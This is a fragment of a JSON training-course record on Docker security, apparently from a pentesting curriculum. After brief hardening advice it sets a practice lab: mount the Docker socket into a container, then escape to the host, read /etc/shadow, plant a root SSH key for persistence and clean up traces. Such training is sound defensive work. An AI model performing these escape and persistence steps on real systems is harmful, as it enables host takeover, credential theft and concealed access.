all**\n\nUse alternatives:\n- Kubernetes API instead of Docker API\n- CRI (Container Runtime Interface) instead of Docker\n- Dedicated monitoring agents that don't need socket access\n\n### Your Turn: Practice Lab\n\n**Objective**: Escape a container with Docker socket mounted.\n\n**Setup:**\n```bash\n# Create vulnerable container\ndocker run -it --rm \\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\n  alpine:latest \\\n  /bin/sh\n```\n\n**Tasks:**\n1. Verify Docker socket is mounted\n2. Install Docker CLI\n3. List all containers on host\n4. Create privileged escape container\n5. Access host filesystem\n6. Add SSH key for persistence\n7. Clean up traces\n\n**Success Criteria:**\n- Successfully create privileged container from within container\n- Read /etc/shadow from host\n- Add SSH key to host's /root/.ssh/authorized_keys\n- SSH to host as root\n\n**Remember**: Only practice in authorized lab environments!"
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC588",
    "Career Path: Cloud Security",
    "Career Path: Pentester",
    "Career Path: Red Teamer",
    "Career Path: Blue Teamer"
  ]
}
